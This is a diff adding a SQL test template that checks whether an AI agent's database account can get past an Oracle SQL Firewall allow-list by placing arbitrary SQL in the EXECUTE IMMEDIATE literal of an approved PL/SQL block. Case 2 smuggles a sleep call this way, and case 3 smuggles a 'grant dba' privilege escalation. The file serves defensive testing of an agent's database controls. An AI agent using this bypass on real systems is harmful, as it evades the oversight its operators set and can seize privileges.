@@ -1,0 +1,38 @@
+-- =============================================================================
+-- bypass_tests.sql.template: can the agent's account use an approved
+-- PL/SQL block to run SQL that is NOT on the SQL Firewall allow-list?
+--
+-- 06_firewall_bypass.sh fills in @SLEEP@ (BYPASS_SLEEP_SECONDS) and @AGENT@
+-- (the agent's user), then replays the statements through SQLcl MCP as the
+-- agent, without a model, with the allow-list ENFORCING.
+--
+-- The approved block (learned in post 03, run by SQLcl itself) is, as the
+-- firewall stores it, with every literal normalised to "?":
+--   DECLARE TABLE_EXISTS INTEGER :=?; BEGIN SELECT COUNT (*) INTO TABLE_EXISTS
+--   FROM ALL_TABLES WHERE TABLE_NAME=? AND OWNER=SYS_CONTEXT (?,?); IF
+--   TABLE_EXISTS=? THEN EXECUTE IMMEDIATE ?; END IF; EXCEPTION WHEN OTHERS THEN
+--   IF SQLCODE=-? THEN DBMS_OUTPUT.PUT_LINE (?); ELSIF SQLCODE=-? THEN
+--   DBMS_OUTPUT.PUT_LINE (?); ELSE DBMS_OUTPUT.PUT_LINE (?||SQLERRM); END IF; END;
+-- The statement EXECUTE IMMEDIATE runs is one of those literals.
+--
+-- Proof that a statement ran: DBMS_SESSION.SLEEP (granted to PUBLIC). If the
+-- call takes @SLEEP@ seconds, the sleep was executed.
+-- =============================================================================
+
+-- Case 1: the sleep, sent directly. Not on the allow-list: the firewall must reject it.
+-- expect: ORA-47605
+begin dbms_session.sleep(@SLEEP@); end;
+
+-- Case 2: the SAME sleep, as the literal of the approved block. Same structure,
+-- different literals: TABLE_NAME of a table that doesn't exist, so the count is
+-- 0 and the IF is true.
+DECLARE TABLE_EXISTS INTEGER := 0; BEGIN SELECT COUNT(*) INTO TABLE_EXISTS FROM ALL_TABLES WHERE TABLE_NAME = 'NO_SUCH_TABLE' AND OWNER = SYS_CONTEXT('USERENV', 'CURRENT_USER'); IF TABLE_EXISTS = 0 THEN EXECUTE IMMEDIATE 'begin dbms_session.sleep(@SLEEP@); end;'; END IF; EXCEPTION WHEN OTHERS THEN IF SQLCODE = -942 THEN DBMS_OUTPUT.PUT_LINE('case 2: ORA-00942'); ELSIF SQLCODE = -955 THEN DBMS_OUTPUT.PUT_LINE('case 2: ORA-00955'); ELSE DBMS_OUTPUT.PUT_LINE('case 2: ' || SQLERRM); END IF; END;
+
+-- Case 3: the same block, with GRANT DBA as its literal. Whatever the firewall
+-- does, the grant needs a privilege the account doesn't have.
+DECLARE TABLE_EXISTS INTEGER := 0; BEGIN SELECT COUNT(*) INTO TABLE_EXISTS FROM ALL_TABLES WHERE TABLE_NAME = 'NO_SUCH_TABLE' AND OWNER = SYS_CONTEXT('USERENV', 'CURRENT_USER'); IF TABLE_EXISTS = 0 THEN EXECUTE IMMEDIATE 'grant dba to @AGENT@'; END IF; EXCEPTION WHEN OTHERS THEN IF SQLCODE = -942 THEN DBMS_OUTPUT.PUT_LINE('case 3: ORA-00942'); ELSIF SQLCODE = -955 THEN DBMS_OUTPUT.PUT_LINE('case 3: ORA-00955'); ELSE DBMS_OUTPUT.PUT_LINE('case 3: ' || SQLERRM); END IF; END;
+
+-- Case 4: the block with one statement added (the sleep, outside the literal).
+-- A different structure: the firewall must reject it.
+-- expect: ORA-47605
+DECLARE TABLE_EXISTS INTEGER := 0; BEGIN SELECT COUNT(*) INTO TABLE_EXISTS FROM ALL_TABLES WHERE TABLE_NAME = 'NO_SUCH_TABLE' AND OWNER = SYS_CONTEXT('USERENV', 'CURRENT_USER'); IF TABLE_EXISTS = 0 THEN EXECUTE IMMEDIATE 'begin null; end;'; DBMS_SESSION.SLEEP(@SLEEP@); END IF; EXCEPTION WHEN OTHERS THEN IF SQLCODE = -942 THEN DBMS_OUTPUT.PUT_LINE('case 4: ORA-00942'); ELSIF SQLCODE = -955 THEN DBMS_OUTPUT.PUT_LINE('case 4: ORA-00955'); ELSE DBMS_OUTPUT.PUT_LINE('case 4: ' || SQLERRM); END IF; END;
